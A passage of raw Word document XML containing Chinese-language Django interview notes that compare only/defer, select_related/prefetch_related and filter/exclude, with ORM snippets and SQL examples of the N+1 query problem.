      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>class UserView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBF2ABF" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def dispatch(self, request, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B84B32B" w14:textId="1A7F9D99" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        return HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BD5555" w14:textId="432EE662"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029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only</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defer</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D1711A" w14:textId="37B5736F" w:rsidR="00BC0D9A" w:rsidRPr="00BC0D9A" w:rsidRDefault="00BC0D9A"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defer--&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>除了指定字段之外（指定字段的内容不被检索）</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#only:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>从数据库中只取指定字段的内容（只查询几个字段）</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AECD3C8" w14:textId="77777777" w:rsidR="00BC0D9A" w:rsidRPr="00BC0D9A" w:rsidRDefault="00BC0D9A"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比如：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ret=Book.object.all().only('name')</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A855143" w14:textId="77777777" w:rsidR="00BC0D9A" w:rsidRPr="00BC0D9A" w:rsidRDefault="00BC0D9A"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id</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>始终会查，结果是</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象</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套</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>book</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象</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里面只有</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DA4D3A" w14:textId="7B925435" w:rsidR="00BC0D9A" w:rsidRPr="00BC0D9A" w:rsidRDefault="00BC0D9A"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如果取</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>price</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，会发生什么？他会再次查询数据库，对数据库造成压力</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7F717F" w14:textId="3BFB4030"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defer(self, *fields):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36320A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models.UserInfo.objects.defer('username','id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C00F6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或</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1C515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models.UserInfo.objects.filter(...).defer('username','id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F31391D" w14:textId="4BE48F41"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映射中排除某列数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E68EC6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only(self, *fields):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A41B6E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仅取某个表中的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7611CDE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models.UserInfo.objects.only('username','id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2415BE1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或</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D54D1E3" w14:textId="22DE796A" w:rsidR="00BC0D9A"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models.UserInfo.objects.filter(...).only('username','id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5DB5B8" w14:textId="17889A8F"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030</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select_related</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prefetch_related</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25110B8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他俩都用于连表查询，减少</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查询次数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F39F3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\select_related</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3230002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select_related</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>主要针一对一和多对一关系进行优化，通过多表</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>join</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>关联查询，一次性获得所有数据，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7681FB8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存放在内存中，但如果关联的表太多，会严重影响数据库性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="739C634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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519A96C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obj = Book.objects.all().select_related("publisher")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329647D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render(request, "index.html", locals())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4F329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\prefetch_related</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B548DC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prefetch_related</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是通过分表，先获取各个表的数据，存放在内存中，然后通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理他们之间的关联。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CF79E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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1384B41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obj = Book.objects.all().prefetch_related("publisher")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A13DA3B" w14:textId="35A21EC1"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render(request, "index.html", locals())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A8061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select_related(self, *fields)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FF69F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性能相关：表之间进行</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>join</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>连表操作，一次性获取关联的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9103F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model.tb.objects.all().select_related()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19530A4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model.tb.objects.all().select_related('</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>外键字段</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BD376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model.tb.objects.all().select_related('</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>外键字段</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>__</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>外键字段</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73044C4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06F021E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prefetch_related(self, *lookups)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4551858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性能相关：多表连表操作时速度会慢，使用其执行多次</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查询在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代码中实现连表操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637CEB2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获取所有用户表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A571AB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获取用户类型表</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>where id in (</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用户表中的查到的所有用户</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ID)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA840D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models.UserInfo.objects.prefetch_related('</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>外键字段</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73CB21B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2DA0FA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from django.db.models import Count, Case, When, IntegerField</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129731F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Article.objects.annotate(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D63ADD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numviews=Count(Case(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0410C8E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When(readership__what_time__lt=treshold, then=1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F9124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output_field=CharField(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783FE48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462EA64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6AD8AE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4AB647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students = Student.objects.all().annotate(num_excused_absences=models.Sum(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD8A78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models.Case(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA0169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models.When(absence__type='Excused', then=1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178EDD2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default=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC6A2D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output_field=models.IntegerField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1D10EB" w14:textId="1916BB32"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51EFF6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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>次</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3139125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select * from userinfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7580AFF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objs = UserInfo.obejcts.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EAE72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for item in objs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B28FF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print(item.name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3749FDE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C9E547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n+1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>次</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511B595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select * from userinfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213FE92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objs = UserInfo.obejcts.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDF4E2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for item in objs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C5629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select * from usertype where id = item.id </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6323F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print(item.name,item.ut.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396701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3FBF33E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select_related</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2538179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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>次</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EDC56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select * from userinfo inner join usertype on userinfo.ut_id = usertype.id </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BC1B6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objs = UserInfo.obejcts.all().select_related('ut')  </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>连表查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6273FD6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for item in objs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CE5BF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print(item.name,item.ut.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05AA3DD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6F131C4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.prefetch_related()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B317C7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select * from userinfo where id &lt;= 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448151A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计算：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>[1,2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30272F4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select * from usertype where id in [1,2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4D203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objs = UserInfo.obejcts.filter(id__lte=8).prefetch_related('ut')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDAAA8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for obj in objs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAAA376" w14:textId="78A3C210"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print(obj.name,obj.ut.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635C3A14" w14:textId="2B10E433"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031</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filter</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exclude</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642D018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filter(self, *args, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9FB5D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条件查询</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符合条件</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630EC16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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
